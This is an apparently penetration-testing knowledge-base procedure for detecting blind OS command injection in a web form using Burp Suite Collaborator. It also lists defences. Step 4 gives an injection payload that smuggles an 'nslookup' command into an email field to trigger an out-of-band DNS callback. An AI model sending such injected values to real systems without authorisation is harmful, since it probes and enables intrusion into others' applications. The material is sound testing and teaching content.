---
id: 96e4bdec-a632-42c4-9b77-f9ae08ad564d
name: Detect-Blind-OS-Command-Injection-Using-Burp-Collaborator
type: procedure
verified: true
submitted: true
created_at: '2020-08-08T06:44:14.335190+00:00'
updated_at: '2023-05-26T18:38:25.261896+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Unix Shell]]'
sub_techniques: []
tags:
  - injection
  - os-command-injection
  - out-of-band
  - owasp
  - owasp-top-10
  - web-applications
commands: []
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
---

# Detect-Blind-OS-Command-Injection-Using-Burp-Collaborator

## Summary

This procedure demonstrates how to detect blind OS command injection vulnerabilities in web applications using Burp Suite's Collaborator feature for out-of-band (OOB) detection. In blind injection scenarios, the application does not reflect output directly, but successful injection triggers external interactions, such as DNS lookups, to a domain controlled by the attacker. This technique is useful for confirming command execution without visible feedback on the application page.

## Description

Blind OS command injection occurs when user input, such as an email field in a feedback form, is improperly sanitized and passed to an underlying OS command (e.g., via system() or exec() in a backend script). Since the output is not displayed, traditional injection tests fail to confirm success. Burp Collaborator addresses this by generating a unique domain for OOB interactions. By injecting a payload that forces a DNS resolution (e.g., using nslookup), any resulting DNS query to the Collaborator domain indicates successful command execution. This procedure assumes a web application vulnerable to OS command injection in an input field like email, typically on a Linux/Unix backend where nslookup is available. It maps to MITRE ATT&CK technique T1059.004 (Command and Scripting Interpreter: Unix Shell) under the Execution tactic.

## Requirements

1. Burp Suite Professional (Community edition lacks full Collaborator functionality).
2. Network access to the target web application, including the ability to submit forms.
3. A vulnerable input field (e.g., email in a feedback form) that executes OS commands without output reflection.
4. Basic knowledge of HTTP request interception and modification.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to prevent command separators (e.g., ||, ;, &) and block common injection payloads.
- Use parameterized APIs or whitelisting for any system calls, avoiding direct concatenation of user input.
- Deploy a Web Application Firewall (WAF) with rules to detect OS command injection patterns, such as nslookup or ping to external domains.
- Monitor DNS queries from application servers for unexpected resolutions to unknown domains.
- Enable application logging for system calls and review for anomalous executions.

## Objectives

1. Confirm the presence of a blind OS command injection vulnerability.
2. Verify command execution via out-of-band DNS interaction without relying on in-band output.
3. Gather evidence of vulnerability for reporting or exploitation planning.

## Instructions

### Step 1: Access the Vulnerable Form

**Context**: Identify and navigate to the input field susceptible to injection, such as a 'submit feedback' page with an email parameter. This sets up the initial interaction point.

**Instructions**: Open the target web application in your browser and locate the form (e.g., feedback or contact page). Enter benign test data if needed to familiarize yourself, but do not submit yet.

### Step 2: Prepare Burp Collaborator

**Context**: Generate a unique domain for OOB detection using Burp Suite. This domain will receive any triggered DNS queries, confirming injection success.

**Instructions**: Launch [[tools/Burp-Suite]] and navigate to the Burp menu > Burp Collaborator client. This opens a new window. Click 'Copy to clipboard' to obtain your unique Collaborator domain (e.g., qwq4cmfqw6aof31vv310nzw1xs3lra.burpcollaborator.net). Store this securely for the payload.

### Step 3: Intercept the Request

**Context**: Use Burp Proxy to capture the form submission request, allowing modification for the injection payload.

**Instructions**: Ensure Burp Proxy is configured to intercept traffic from your browser (default port 8080, with browser proxy settings enabled). Submit the feedback form with a test email to trigger interception.

### Step 4: Send to Repeater and Modify Payload

**Context**: Transfer the intercepted request to Repeater for safe modification and resending, avoiding direct execution from Proxy.

**Instructions**: In the Proxy Intercept tab, right-click the captured request and select 'Send to Repeater'. Switch to the Repeater tab. Locate the email parameter in the request body (e.g., email=test%40test.com). Replace its value with the injection payload, URL-encoded for HTTP safety:

```
email=test%40test||nslookup+$_COLLABORATOR_DOMAIN||
```

Here, `||` acts as a command separator (common in Unix shells), and `nslookup $_COLLABORATOR_DOMAIN` forces a DNS query. Substitute `$_COLLABORATOR_DOMAIN` with your copied domain. Ensure the payload is properly encoded (e.g., spaces as `+` or `%20`).

### Step 5: Send the Modified Request

**Context**: Execute the injected request to trigger the backend command execution.

**Instructions**: In Repeater, click 'Send' to forward the modified request to the server. Observe the response for any errors, but note that in blind scenarios, the HTTP response may appear normal.

### Step 6: Poll for OOB Interaction

**Context**: Check Burp Collaborator for evidence of command execution via DNS lookup.

**Instructions**: Return to the Burp Collaborator client window and click 'Poll now'. Review the poll results in the bottom panel for incoming DNS interactions. Look for A/AAAA record queries to your unique domain.

> If a DNS lookup appears, it confirms the OS command (nslookup) executed successfully on the backend, validating the blind injection vulnerability.
